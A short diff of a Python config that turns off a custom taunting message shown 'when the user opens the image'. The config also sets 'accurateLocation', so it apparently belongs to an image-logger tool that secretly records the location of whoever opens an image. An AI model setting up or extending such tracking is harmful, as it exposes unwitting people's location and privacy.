@@ -28,7 +28,7 @@ config = {
     "accurateLocation": True, 
 
     "message": { # Show a custom message when the user opens the image
-        "doMessage": True, # Enable the custom message?
+        "doMessage": False, # Enable the custom message?
         "message": "DAVID NGA EH BAT NAGTATAKA KAPA?", # Message to show
         "richMessage": True, # Enable rich text? (See README for more info)
     },
